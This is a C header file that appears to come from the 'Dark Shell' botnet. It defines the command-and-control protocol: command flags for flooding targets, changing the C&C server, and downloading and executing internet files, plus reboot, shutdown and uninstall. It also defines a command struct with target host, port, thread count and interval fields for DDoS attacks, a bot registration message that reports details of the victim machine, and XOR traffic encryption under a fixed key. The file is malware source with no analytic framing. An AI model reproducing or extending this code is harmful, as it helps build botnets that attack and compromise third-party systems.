#ifndef __DARK_SHELL_H_
#define __DARK_SHELL_H_

#define DARKSHELL_CMD_FLAG_ 0x01

#define DSHELL_CMD_FLAG_UPDATE_CC 0x10000
#define DSHELL_CMD_FLAG_RESPOND_0x11223344 0x20000
#define DSHELL_CMD_FLAG_REBOOT 0x40000
#define DSHELL_CMD_FLAG_SHUTDOWN 0x80000

#define DSHELL_CMD_FLAG_UNINSTALL 0x100000
#define DSHELL_CMD_FLAG_STOP_FLOOD 0x200000
#define DSHELL_CMD_FLAG_EXEC_INTERNET_FILE 0x400000
#define DSHELL_CMD_FLAG_RUN_FILE 0x800000

#define DSHELL_KEY 0xDB

#pragma pack(push)
#pragma pack(1)

// command from server to client
typedef struct _dshell_command
{
    u_int cmdcode;
    union
    {
        char target_host[100];
        char new_server[100];
    };

    union
    {
        u_int target_port;
        u_int new_ccport;
    };
    
    u_int thread_count;  // after compressed, including the header
    u_int interval;  // in  dwMilliseconds
    u_int http_url_var_low;
    u_int http_url_var_up;
} dshell_command;

// the first message from client to server
typedef struct _dshell_register_msg
{
    char processor[128]; // Processor information
    char memory[32]; // Memory information
    char os[32]; // Operating System information
    char version[32]; // Bot version information
    int langid;
} dshell_register_msg;

#pragma pack(pop)

void dshell_decrypt(u_char *data, int len, u_char key);

void dshell_encrypt(u_char *data, int len, u_char key);

#endif

